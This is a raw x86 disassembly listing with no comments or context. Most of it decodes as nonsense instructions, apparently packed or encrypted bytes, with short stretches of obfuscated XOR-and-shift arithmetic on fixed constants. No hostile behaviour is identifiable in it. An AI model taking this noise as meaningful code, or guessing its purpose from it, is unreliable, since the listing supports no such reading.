  40a37c:	mov    dl,0xa4
  40a37e:	and    ch,dl
  40a380:	or     DWORD PTR [eax-0x4f],ebx
  40a383:	xchg   edi,eax
  40a384:	inc    edx
  40a385:	push   esi
  40a386:	mov    ebp,0x46c60c3d
  40a38b:	in     al,dx
  40a38c:	jne    0x40a367
  40a38e:	arpl   WORD PTR ds:0xa9d6de3a,bx
  40a394:	or     eax,0xc352a1d6
  40a39a:	in     eax,0x7b
  40a39c:	sub    eax,ebx
  40a39e:	jno    0x40a3b2
  40a3a0:	dec    esp
  40a3a1:	mov    eax,0x649e7de6
  40a3a6:	mov    eax,fs:0x973b1a14
  40a3ac:	shr    BYTE PTR [eax+ebx*4],1
  40a3af:	dec    edi
  40a3b0:	jg     0x40a350
  40a3b2:	xchg   dh,ch
  40a3b4:	cld    
  40a3b5:	or     DWORD PTR [esi-0x2f],esi
  40a3b8:	std    
  40a3b9:	sub    BYTE PTR [ebx],dh
  40a3bb:	jo     0x40a3f3
  40a3bd:	pop    ecx
  40a3be:	jecxz  0x40a436
  40a3c0:	imul   edi,DWORD PTR [edi],0x4cd431e4
  40a3c6:	sbb    ebx,ebp
  40a3c8:	(bad)  
  40a3c9:	pop    ds
  40a3ca:	aam    0x26
  40a3cc:	call   0x68b4:0x9daeb845
  40a3d3:	(bad)
  40a3d6:	test   esp,ecx
  40a3d8:	fbstp  TBYTE PTR [eax-0x6aecfbfa]
  40a3de:	xchg   ebx,eax
  40a3df:	xchg   edx,eax
  40a3e0:	xor    esi,esi
  40a3e2:	mov    esp,0x72a3b60c
  40a3e7:	clc    
  40a3e8:	push   ss
  40a3e9:	jno    0x40a3e0
  40a3eb:	clc    
  40a3ec:	jae    0x40a448
  40a3ee:	js     0x40a3b9
  40a3f0:	mov    es,WORD PTR [edx+0x6798803a]
  40a3f6:	sbb    esi,DWORD PTR [eax-0xfb454ea]
  40a3fc:	pop    esi
  40a3fd:	mov    eax,ds:0xea937685
  40a402:	push   esi
  40a403:	lock mov ch,0xc8
  40a406:	push   es
  40a407:	pop    esp
  40a408:	data16 fist WORD PTR [ebp+0x4e]
  40a40c:	mov    ds:0xe89451af,eax
  40a411:	mov    al,0xa9
  40a413:	jb     0x40a447
  40a415:	xchg   ecx,eax
  40a416:	mov    dl,0xd5
  40a418:	xor    DWORD PTR [ecx],ebx
  40a41a:	daa    
  40a41b:	das    
  40a41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a41d:	add    ecx,esp
  40a41f:	outs   dx,BYTE PTR ds:[esi]
  40a420:	scas   eax,DWORD PTR es:[edi]
  40a421:	test   ecx,eax
  40a423:	fsubr  QWORD PTR [edi-0x38658c41]
  40a429:	sbb    DWORD PTR [ecx+edx*2-0x46],ebx
  40a42d:	iret   
  40a42e:	fs mov ch,0xc
  40a431:	mov    WORD PTR [ecx],?
  40a433:	adc    esi,DWORD PTR [ecx-0x336e8034]
  40a439:	call   0x4cef:0xd3aafee5
  40a440:	pop    edi
  40a441:	fmul   QWORD PTR [edx-0x30a5196]
  40a447:	pop    ss
  40a448:	popa   
  40a449:	and    cl,dl
  40a44b:	sub    dl,BYTE PTR [esi+0x44838ece]
  40a451:	jg     0x40a4b7
  40a453:	fwait
  40a454:	mov    ch,0x9e
  40a456:	sbb    esi,ebx
  40a458:	pusha  
  40a459:	jbe    0x40a4bb
  40a45b:	inc    esp
  40a45c:	aam    0x77
  40a45e:	icebp  
  40a45f:	inc    ebx
  40a460:	out    0x9c,al
  40a462:	lds    esi,FWORD PTR [eax]
  40a464:	mov    edi,0x3c9fe21a
  40a469:	js     0x40a42c
  40a46b:	call   0xd7a654fa
  40a470:	fstp   st(5)
  40a472:	adc    dl,BYTE PTR [ecx]
  40a474:	(bad)  
  40a475:	repz pop ebx
  40a477:	add    esi,ecx
  40a479:	pop    ds
  40a47a:	or     DWORD PTR [edx-0x1f],edi
  40a47d:	and    esp,ecx
  40a47f:	sbb    eax,0xd5a145ed
  40a484:	daa    
  40a485:	and    edi,DWORD PTR [edi]
  40a487:	je     0x40a43d
  40a489:	sbb    eax,0xef7d0c3d
  40a48e:	rcl    edi,0x69
  40a491:	sbb    bl,cl
  40a493:	xchg   esi,eax
  40a494:	(bad)  
  40a495:	mov    ch,0x5c
  40a497:	(bad)
  40a49a:	xchg   esp,eax
  40a49b:	shl    cl,1
  40a49d:	jns    0x40a4d1
  40a49f:	pop    ss
  40a4a0:	xchg   ebp,eax
  40a4a1:	mov    bl,0x4d
  40a4a3:	xor    BYTE PTR [ebp+0x2f4af2ef],0xc5
  40a4aa:	jns    0x40a4fa
  40a4ac:	add    DWORD PTR [esi],0x3fa498b9
  40a4b2:	push   ecx
  40a4b3:	pop    ecx
  40a4b4:	rol    esp,0x71
  40a4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4b8:	ds ja  0x40a47c
  40a4bb:	xchg   DWORD PTR [edi+0x6ff3f37b],esp
  40a4c1:	aaa    
  40a4c2:	sub    ah,BYTE PTR ds:0x9d221625
  40a4c8:	sti    
  40a4c9:	ins    DWORD PTR es:[edi],dx
  40a4ca:	sub    BYTE PTR ds:0xa0d31936,cl
  40a4d0:	jl     0x40a496
  40a4d2:	pop    eax
  40a4d3:	adc    al,0xa8
  40a4d5:	adc    BYTE PTR [edi+0x4e0c978a],0x57
  40a4dc:	aad    0x7
  40a4de:	fstp   QWORD PTR [ecx+0x34]
  40a4e1:	xor    eax,0x42fee4fa
  40a4e6:	push   ds
  40a4e7:	mov    bh,0x4f
  40a4e9:	jae    0x40a49d
  40a4eb:	ror    DWORD PTR [ebx-0x34719e79],cl
  40a4f1:	hlt    
  40a4f2:	push   es
  40a4f3:	or     eax,0xc726e881
  40a4f8:	add    BYTE PTR [eax],al
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a552
  40a524:	mov    esp,0x2bd8befe
  40a529:	sbb    BYTE PTR [eax],bl
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    BYTE PTR [ecx],ch
  40a530:	iret   
  40a531:	mov    ecx,0x401beef8
  40a536:	inc    edx
  40a537:	mov    ah,0xa
  40a539:	jns    0x40a5ae
  40a53b:	(bad)  
  40a53d:	cmp    eax,0x8055452e
  40a542:	ins    DWORD PTR es:[edi],dx
  40a543:	ja     0x40a4d0
  40a545:	test   BYTE PTR [ebp-0x26a67a09],0x71
  40a54c:	std    
  40a54d:	push   0x94e2beb9
  40a552:	inc    eax
  40a553:	ins    DWORD PTR es:[edi],dx
  40a554:	je     0x40a54c
  40a556:	ss mov eax,0x6fafcbd9
  40a55c:	dec    edi
  40a55d:	push   cs
  40a55e:	daa    
  40a55f:	daa    
  40a560:	xor    esi,eax
  40a562:	xchg   esi,eax
  40a563:	mov    al,ds:0x727a5254
  40a568:	pop    eax
  40a569:	jmp    0x82468efe
  40a56e:	mov    edx,0xb3d840d3
  40a573:	imul   eax,DWORD PTR [ebp+0x2b],0xcca5100b
  40a57a:	xchg   DWORD PTR [eax],esi
  40a57c:	leave  
  40a57d:	out    0x1a,al
  40a57f:	add    al,0xc9
  40a581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a582:	nop
  40a583:	stc    
  40a584:	ja     0x40a5f5
  40a586:	push   esp
  40a587:	dec    ebx
  40a588:	aam    0x5e
  40a58a:	loop   0x40a55c
  40a58c:	mov    al,ds:0xf333d29a
  40a591:	ret    
  40a592:	inc    esp
  40a593:	dec    ebp
  40a594:	jecxz  0x40a52e
  40a596:	fwait
  40a597:	dec    edi
  40a598:	xchg   ebx,eax
  40a599:	std    
  40a59a:	cmp    BYTE PTR [edx],dl
  40a59c:	pop    edi
  40a59d:	sbb    eax,0xce6b6607
  40a5a2:	sub    DWORD PTR ds:0x961fb6de,ebp
  40a5a8:	inc    ebp
  40a5a9:	in     eax,0xf6
  40a5ab:	and    al,0x90
  40a5ad:	pop    ecx
  40a5ae:	push   cs
  40a5af:	inc    eax
  40a5b0:	ds jo  0x40a580
  40a5b3:	sahf   
  40a5b4:	push   0xaea4be2d
  40a5b9:	or     bh,BYTE PTR ss:0xb685bf33
  40a5c0:	enter  0xb431,0xb1
  40a5c4:	dec    edx
  40a5c5:	pcmpeqd mm6,mm0
  40a5c8:	xor    eax,0x97f396d7
  40a5cd:	fsubr  st,st(0)
  40a5cf:	icebp  
  40a5d0:	mov    ah,0x16
  40a5d2:	gs jne 0x40a64d
  40a5d5:	(bad)  
  40a5d6:	mov    cl,0x33
  40a5d8:	xchg   edi,eax
  40a5d9:	cwde   
  40a5da:	jnp    0x40a64f
  40a5dc:	xor    eax,0xffe28a9a
  40a5e1:	dec    eax
  40a5e2:	imul   eax,DWORD PTR [ebp+0x78e01053],0xa3a10691
  40a5ec:	es jo  0x40a61c
  40a5ef:	jne    0x40a5b1
  40a5f1:	and    al,0x80
  40a5f3:	(bad)  
  40a5f4:	fisubr WORD PTR [ecx+0x437edd60]
  40a5fa:	cli    
  40a5fb:	loop   0x40a5fb
  40a5fd:	stos   BYTE PTR es:[edi],al
  40a5fe:	xchg   DWORD PTR [edi-0x63],ecx
  40a601:	xchg   DWORD PTR [ebx-0x1b47c586],ecx
  40a607:	scas   al,BYTE PTR es:[edi]
  40a608:	mov    ecx,0x805d2310
  40a60d:	mov    gs,WORD PTR [edi-0x74c09250]
  40a613:	inc    eax
  40a614:	mov    ds:0x2c5d1085,eax
  40a619:	into   
  40a61a:	adc    al,0xd3
  40a61c:	ins    BYTE PTR es:[edi],dx
  40a61d:	popf   
  40a61e:	out    0x91,al
  40a620:	dec    esi
  40a621:	iret   
  40a622:	or     al,cl
  40a624:	pop    es
  40a625:	sub    al,0xe7
  40a627:	shl    BYTE PTR [edi],0xff
  40a62a:	jns    0x40a66d
  40a62c:	pop    ds
  40a62d:	pushf  
  40a62e:	fnstenv [ebx+edi*2]
  40a631:	sbb    ebx,0xb5f71ec8
  40a637:	pop    ebp
  40a638:	push   edx
  40a639:	out    dx,eax
  40a63a:	sbb    eax,0xa92019d6
  40a63f:	popa   
  40a640:	xor    BYTE PTR [ebx+0x1f813d3e],al
  40a646:	sub    esp,DWORD PTR [esi]
  40a648:	fisubr WORD PTR [ebx]
  40a64a:	pop    ecx
  40a64b:	(bad)  
  40a64c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a64d:	mov    BYTE PTR [ecx],dh
  40a64f:	push   ecx
  40a650:	or     ebx,DWORD PTR [edx]
  40a652:	sub    al,0xfd
  40a654:	imul   ecx,DWORD PTR [eax-0x687a237f],0xaddff51d
  40a65e:	sub    eax,esi
  40a660:	xor    BYTE PTR [edx+ebx*2-0x8],0x91
  40a665:	push   edx
  40a666:	das    
  40a667:	mov    ebp,0x98b35268
  40a66c:	adc    BYTE PTR [edi+esi*2+0x1251bb56],bh
  40a673:	push   0x20e5b908
  40a678:	popa   
  40a679:	sub    bl,dl
  40a67b:	jmp    0x40a6e2
  40a67d:	mov    al,ds:0x9aac63e6
  40a682:	mov    DWORD PTR [esi+0x29],esi
  40a685:	stc    
  40a686:	icebp  
  40a687:	jnp    0x40a675
  40a689:	cs (bad) 
  40a68b:	cmc    
  40a68c:	or     BYTE PTR [edx-0x1d8d8af1],0x45
  40a693:	jo     0x40a619
  40a695:	out    dx,eax
  40a696:	ret    
  40a697:	dec    esp
  40a698:	in     eax,dx
  40a699:	inc    esi
  40a69a:	xchg   ebp,eax
  40a69b:	adc    ebp,DWORD PTR [ebp-0xd]
  40a69e:	cmp    bh,BYTE PTR [edx+ebx*1+0x72]
  40a6a2:	pop    esp
  40a6a3:	xor    ecx,DWORD PTR [esi+0x326bfaeb]
  40a6a9:	and    eax,0xa52ad326
  40a6ae:	sbb    DWORD PTR [eax+0x1358b90e],ebx
  40a6b4:	xchg   dl,dl
  40a6b6:	adc    edx,esi
  40a6b8:	inc    edx
  40a6b9:	in     al,0x85
  40a6bb:	adc    esp,DWORD PTR [ebp+0x5fcb763]
  40a6c1:	mov    ds:0x8be4e672,eax
  40a6c6:	(bad)  
  40a6c7:	(bad)  [esi]
  40a6c9:	lahf   
  40a6ca:	xlat   BYTE PTR ds:[ebx]
  40a6cb:	and    eax,0x6f90b09a
  40a6d0:	and    DWORD PTR [ecx],0x30bd4ec6
  40a6d6:	push   ss
  40a6d7:	inc    ebx
  40a6d8:	fnsave [ebx+0x75]
  40a6db:	mov    bl,0xc8
  40a6dd:	push   edi
  40a6de:	inc    esp
  40a6df:	sub    bh,cl
  40a6e1:	or     DWORD PTR [eax-0x4c],ebp
  40a6e4:	lods   al,BYTE PTR ds:[esi]
  40a6e5:	gs popa 
  40a6e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6e8:	cwde   
  40a6e9:	je     0x40a680
  40a6eb:	test   eax,0xd35c5871
  40a6f0:	js     0x40a6c8
  40a6f2:	loope  0x40a6ff
  40a6f4:	call   0x8660:0x5916c942
  40a6fb:	(bad)  
  40a6fc:	xlat   BYTE PTR ds:[ebx]
  40a6fd:	push   esp
  40a6fe:	jb     0x40a738
  40a700:	aad    0x61
  40a702:	repz add edi,DWORD PTR [ebp+0x193ff622]
  40a709:	xor    eax,0xeea6466b
  40a70e:	(bad)  
  40a70f:	xor    cl,BYTE PTR [eax-0x5111bb53]
  40a715:	sub    eax,0x43d1030
  40a71a:	inc    ebp
  40a71c:	mov    WORD PTR [esi+eax*8-0x78e4a736],gs
  40a723:	mov    edi,esp
  40a725:	or     bl,BYTE PTR ds:0x11afc63b
  40a72b:	xor    DWORD PTR [ebx],edx
  40a72d:	data16 cli 
  40a72f:	inc    edx
  40a730:	cmc    
  40a731:	rcl    dl,1
  40a733:	or     eax,0x30b8fcb4
  40a738:	std    
  40a739:	leave  
  40a73a:	bound  ebx,QWORD PTR [edi+0x1c]
  40a73d:	cs jge 0x40a774
  40a740:	dec    ebp
  40a741:	lea    eax,es:[eax+0x12]
  40a745:	frstor [edi]
  40a747:	mov    bh,0xb7
  40a749:	sub    ebx,ebx
  40a74b:	bound  ecx,QWORD PTR [edi]
  40a74d:	xchg   edi,eax
  40a74e:	xor    al,0xe1
  40a750:	xor    BYTE PTR fs:[ebx+0x57df27d4],dh
  40a757:	not    DWORD PTR [edi+0x29db4b2f]
  40a75d:	jl     0x40a727
  40a75f:	xor    DWORD PTR [esp+ebp*4-0x5e],ecx
  40a763:	ins    DWORD PTR es:[edi],dx
  40a764:	dec    ebp
  40a765:	fmul   st(0),st
  40a767:	cmp    BYTE PTR ds:[edi+0x7f],ch
  40a76b:	add    edi,esi
  40a76d:	lds    esp,FWORD PTR [ebx]
  40a76f:	outs   dx,BYTE PTR ds:[esi]
  40a770:	loope  0x40a7ac
  40a772:	inc    eax
  40a773:	enter  0x3696,0xde
  40a777:	test   BYTE PTR [ecx+0x65],ch
  40a77a:	je     0x40a79b
  40a77c:	jno    0x40a7c1
  40a77e:	mov    ch,0x26
  40a780:	lahf   
  40a781:	jae    0x40a7e3
  40a783:	dec    ebx
  40a784:	shl    ch,cl
  40a786:	xchg   esi,eax
  40a787:	pop    ecx
  40a788:	jnp    0x40a7c5
  40a78a:	inc    eax
  40a78b:	scas   al,BYTE PTR es:[edi]
  40a78c:	pop    ss
  40a78d:	ins    BYTE PTR es:[edi],dx
  40a78e:	jb     0x40a714
  40a790:	mov    bh,BYTE PTR [esi-0x4c]
  40a793:	fdivr  QWORD PTR [edx+edx*2+0x2f5a7248]
  40a79a:	ins    BYTE PTR es:[edi],dx
  40a79b:	call   FWORD PTR [esi-0x5f]
  40a79e:	outs   dx,BYTE PTR ds:[esi]
  40a79f:	or     eax,0x62401d3
  40a7a4:	and    eax,0x6f70ea4f
  40a7a9:	mov    eax,ds:0xc2d1dde4
  40a7ae:	pushf  
  40a7af:	jp     0x40a765
  40a7b1:	retf   
  40a7b2:	js     0x40a795
  40a7b4:	test   al,dh
  40a7b6:	adc    al,0xf9
  40a7b8:	pop    ds
  40a7b9:	push   ebp
  40a7ba:	mov    cl,0x8c
  40a7bc:	mov    cl,0xa4
  40a7be:	xchg   DWORD PTR [esi],eax
  40a7c0:	arpl   si,sp
  40a7c2:	daa    
  40a7c3:	jb     0x40a843
  40a7c5:	sub    DWORD PTR [esi],edx
  40a7c7:	aad    0x8a
  40a7c9:	ins    BYTE PTR es:[edi],dx
  40a7ca:	fcom   QWORD PTR [esi-0x1b]
  40a7cd:	and    DWORD PTR [ecx+0x2d],esp
  40a7d0:	daa    
  40a7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7d2:	pop    esp
  40a7d3:	in     eax,dx
  40a7d4:	push   edi
  40a7d5:	in     eax,dx
  40a7d6:	mov    ah,BYTE PTR [eax-0x58]
  40a7d9:	aam    0x1c
  40a7db:	icebp  
  40a7dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7dd:	push   esp
  40a7de:	aad    0xad
  40a7e0:	xchg   ebx,eax
  40a7e1:	call   0x602:0x5d667167
  40a7e8:	stos   BYTE PTR es:[edi],al
  40a7e9:	pop    es
  40a7ea:	add    bl,bh
  40a7ec:	out    dx,eax
  40a7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7ee:	dec    ebp
  40a7ef:	inc    ebp
  40a7f0:	push   edi
  40a7f1:	shl    BYTE PTR [ebx],1
  40a7f3:	clc    
  40a7f4:	push   ecx
  40a7f5:	add    BYTE PTR [ebx-0x76],al
  40a7f8:	iret   
  40a7f9:	add    eax,0x35f3ad6
  40a7fe:	sub    BYTE PTR [edx+0x73],dl
  40a801:	aaa    
  40a802:	pop    es
  40a803:	ficom  DWORD PTR [esp+eax*2+0x22]
  40a807:	sub    DWORD PTR ds:0xb959d88d,0x7c
  40a80e:	add    BYTE PTR [eax+0x583ec6f0],cl
  40a814:	inc    DWORD PTR [edx-0xf]
  40a817:	lahf   
  40a818:	not    BYTE PTR [edx]
  40a81a:	and    al,0xc1
  40a81c:	xchg   esi,eax
  40a81d:	add    BYTE PTR ds:[ebp-0x3c],ch
  40a821:	mov    cl,0x53
  40a823:	pushf  
  40a824:	addr16 and al,0xf0
  40a827:	repnz mov cl,0x39
  40a82a:	shl    BYTE PTR [eax],cl
  40a82c:	call   0x3525:0xd5b634f8
  40a833:	mov    ah,0xa0
  40a835:	inc    edx
  40a836:	imul   esp,DWORD PTR ds:0x16559cca,0x42b8182e
  40a840:	fwait
  40a841:	and    eax,0xc1d89351
  40a846:	into   
  40a847:	push   0xffffffa0
  40a849:	and    al,0xa4
  40a84b:	js     0x40a84c
  40a84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a84e:	mov    bh,0x76
  40a850:	fist   WORD PTR [edx+eiz*2+0x22882b4d]
  40a857:	pusha  
  40a858:	mov    bl,0x80
  40a85a:	out    0x1d,al
  40a85c:	pop    ds
  40a85d:	les    esi,FWORD PTR [esi]
  40a85f:	fisttp QWORD PTR [edx]
  40a861:	sub    ch,BYTE PTR [ebx+0x1d071fcf]
  40a867:	fstp   DWORD PTR [edx-0x6b50904a]
  40a86d:	xlat   BYTE PTR ds:[ebx]
  40a86e:	jge    0x40a872
  40a870:	cmp    eax,DWORD PTR [edi+0x67f0ed74]
  40a876:	and    bl,BYTE PTR [ebx+eiz*8+0x25cd03d0]
  40a87d:	into   
  40a87e:	cld    
  40a87f:	adc    BYTE PTR [ecx],cl
  40a881:	push   ss
  40a882:	mov    es,esi
  40a884:	sti    
  40a885:	aas    
  40a886:	mov    ecx,0x7f60d9bd
  40a88b:	mov    edx,0x762d0fd
  40a890:	sub    BYTE PTR cs:[ebx-0x22],ah
  40a894:	pop    ds
  40a895:	and    esi,edx
  40a897:	mov    ds,WORD PTR [ebp-0x6de6a3d8]
  40a89d:	in     al,dx
  40a89e:	jp     0x40a89e
  40a8a0:	jno    0x40a8d8
  40a8a2:	jne    0x40a91e
  40a8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a5:	es jmp 0x40a8b1
  40a8a8:	adc    DWORD PTR [ecx-0x2b],0xb6ec599d
  40a8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8b0:	dec    esp
  40a8b1:	test   eax,0xf7a60911
  40a8b6:	popa   
  40a8b7:	popa   
  40a8b8:	in     al,0x3b
  40a8ba:	nop
  40a8bb:	aas    
  40a8bc:	mov    esi,0xcad00834
  40a8c1:	in     eax,0xf3
  40a8c3:	dec    esp
  40a8c4:	and    BYTE PTR [esi],al
  40a8c6:	mov    eax,ds:0x10e80ee4
  40a8cb:	jo     0x40a852
  40a8cd:	lods   al,BYTE PTR ds:[esi]
  40a8ce:	mov    ecx,0x6a69995b
  40a8d3:	les    ebp,FWORD PTR [ebx]
  40a8d5:	pushf  
  40a8d6:	test   al,0xba
  40a8d8:	inc    ecx
  40a8d9:	je     0x40a891
  40a8db:	lds    ebp,FWORD PTR [edi+0xb]
  40a8de:	push   es
  40a8df:	shl    BYTE PTR [ebx-0x65],0xae
  40a8e3:	shl    BYTE PTR [ecx+ebp*1],1
  40a8e6:	stos   DWORD PTR es:[edi],eax
  40a8e7:	test   BYTE PTR [ebp+0x2a4db48f],bh
  40a8ed:	xor    eax,0x5589d699
  40a8f2:	adc    BYTE PTR [ebx+0x47b8b13],cl
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428313,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x428307,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428263,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x42830b,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428293
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428287,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x428303
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42823b
  40aa46:	sbb    DWORD PTR ds:0x42817b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0xe37e1f6a
  40aa65:	shl    BYTE PTR [ebx],cl
  40aa67:	stos   BYTE PTR es:[edi],al
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	cwde   
  40aa71:	hlt    
  40aa72:	dec    eax
  40aa73:	daa    
  40aa74:	add    DWORD PTR [esi+0x41d4ad75],0xf95d28e1
  40aa7e:	push   cs
  40aa7f:	outs   dx,DWORD PTR ds:[esi]
  40aa80:	mov    WORD PTR [edx+0x3d],es
  40aa83:	adc    al,0xc7
  40aa85:	aaa    
  40aa86:	mov    edi,0xd255782a
  40aa8b:	lea    eax,[edx+0x2c]
  40aa8e:	call   0xd4a:0xe5d13a00
  40aa95:	pop    ecx
  40aa96:	mov    DWORD PTR [ebp-0x9],eax
  40aa99:	in     eax,dx
  40aa9a:	and    DWORD PTR [ebx],esp
  40aa9c:	mov    bh,BYTE PTR ds:0xb75611ef
  40aaa2:	stc    
  40aaa3:	adc    al,ah
  40aaa5:	add    eax,0x691641b2
  40aaaa:	and    al,0x10
  40aaac:	push   0x12a855a2
  40aab1:	fidiv  DWORD PTR [ebx+0x48]
  40aab4:	test   al,0xc1
  40aab6:	rol    BYTE PTR [ebx-0x2],1
  40aab9:	mov    eax,DWORD PTR [ebp+0x653c4680]
  40aabf:	inc    esi
  40aac0:	add    al,0x61
  40aac2:	xchg   edx,eax
  40aac3:	sahf   
  40aac4:	jno    0x40ab19
  40aac6:	push   edi
  40aac7:	pop    eax
  40aac8:	out    0x1d,al
  40aaca:	ret    0xa052
  40aacd:	pop    esp
  40aace:	mov    esp,0x116df8c8
  40aad3:	scas   eax,DWORD PTR es:[edi]
  40aad4:	adc    dh,BYTE PTR [ecx]
  40aad6:	jmp    0xf649c03f
  40aadb:	cli    
  40aadc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aadd:	cmp    esp,DWORD PTR [ebp+0x71266a1a]
  40aae3:	and    BYTE PTR [edi-0x5],0xdc
  40aae7:	dec    edx
  40aae8:	call   0x61d1:0x742df295
  40aaef:	jmp    0xc0cd65a6
  40aaf4:	jns    0x40aaff
  40aaf6:	(bad)  
  40aaf7:	nop
  40aaf8:	push   edi
  40aaf9:	es sub al,0x3f
  40aafc:	or     eax,0x89e529dd
  40ab01:	dec    edi
  40ab02:	test   DWORD PTR [eax+0x37cb98a7],edi
  40ab08:	xchg   edi,eax
  40ab09:	dec    edi
  40ab0a:	xchg   edi,eax
  40ab0b:	rcl    DWORD PTR [ebx-0x5],cl
  40ab0e:	inc    ebp
  40ab0f:	sub    al,0x42
  40ab11:	or     BYTE PTR [esi-0x49],0xab
  40ab15:	add    eax,0x4ac2dc9b
  40ab1a:	inc    DWORD PTR [esi+0x18]
  40ab1d:	retf   0x9c2b
  40ab20:	sub    BYTE PTR [edi],bh
  40ab22:	add    eax,0x8a60b0cc
  40ab27:	bound  ecx,QWORD PTR [ecx-0x25]
  40ab2a:	inc    eax
  40ab2b:	jbe    0x40aad0
  40ab2d:	push   eax
  40ab2e:	jno    0x40aadd
  40ab30:	xlat   BYTE PTR ds:[ebx]
  40ab31:	mov    ah,0x34
  40ab33:	ret    
  40ab34:	jns    0x40aadf
  40ab36:	jmpw   0xcba3
  40ab3a:	ja     0x40ab7e
  40ab3c:	sbb    dl,BYTE PTR [edi-0x5c]
  40ab3f:	ficom  WORD PTR [ecx+0x5f8c0969]
  40ab45:	loop   0x40ab26
  40ab47:	daa    
  40ab48:	cmc    
